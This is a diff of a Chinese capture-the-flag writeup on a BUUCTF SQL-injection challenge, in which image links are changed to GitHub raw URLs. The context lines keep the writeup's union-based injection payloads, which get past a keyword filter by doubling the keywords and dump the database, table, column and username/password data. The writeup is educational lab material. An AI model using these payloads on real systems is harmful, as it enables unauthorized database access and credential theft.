@@ -10,11 +10,11 @@
 
 根据报错吧信息，判断过滤了select,但是这个过滤可以使用双写绕过
 
-![](images/A2838492AF974F2BA71A3DEE4D2D4BF9clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/A2838492AF974F2BA71A3DEE4D2D4BF9clipboard.png)
 
 
 
-![](images/9D2BBA4BFD8B41D387FE705D8EDA2A41clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/9D2BBA4BFD8B41D387FE705D8EDA2A41clipboard.png)
 
 or ,and等都显示输入username，可以判断or,and,union等都被过滤，但是使用双写绕过既可绕过过滤
 
@@ -34,7 +34,7 @@ password=1'ununionion%20selselectect%20null,null,database()--+
 
 确定数据库未geek
 
-![](images/36B6475675F9498A8CC06BDD0FA7459Cclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/36B6475675F9498A8CC06BDD0FA7459Cclipboard.png)
 
 
 
@@ -46,7 +46,7 @@ password=1'ununionion%20selselectect%20null,null,select%20group_concat(table_nam
 
 
 
-![](images/747D55C9125B4183B470489AA2F84D83clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/747D55C9125B4183B470489AA2F84D83clipboard.png)
 
 确定geek数据库中有两个表，b4bsql,geekuser
 
@@ -60,7 +60,7 @@ password=1'ununionion%20selselectect%20null,null,select%20group_concat(column_na
 
 确定geekuser表中有username和password字段。
 
-![](images/73AA841372444F9FAE936DFF31B9A8A4clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/73AA841372444F9FAE936DFF31B9A8A4clipboard.png)
 
 
 
@@ -76,5 +76,5 @@ password=1'ununionion%20selselectect%20null,null,select%20group_concat(username,
 
 
 
-![](images/038F02B8D15A41CB85D4E995556DC8D4clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/038F02B8D15A41CB85D4E995556DC8D4clipboard.png)
 
